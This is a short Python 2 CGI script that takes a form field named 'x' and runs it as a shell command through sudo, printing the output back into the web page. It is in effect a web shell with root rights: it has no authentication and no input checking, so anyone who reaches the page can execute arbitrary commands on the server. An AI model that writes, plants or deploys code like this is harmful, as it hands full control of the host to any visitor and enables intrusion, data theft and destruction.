#!/usr/bin/python2

import commands
import cgi

print "Content-Type: text/html"
print 

cmd=cgi.FormContent()['x'][0]
#print "<pre>"
print "output : " + commands.getoutput("sudo " + cmd)
#print "</pre>"
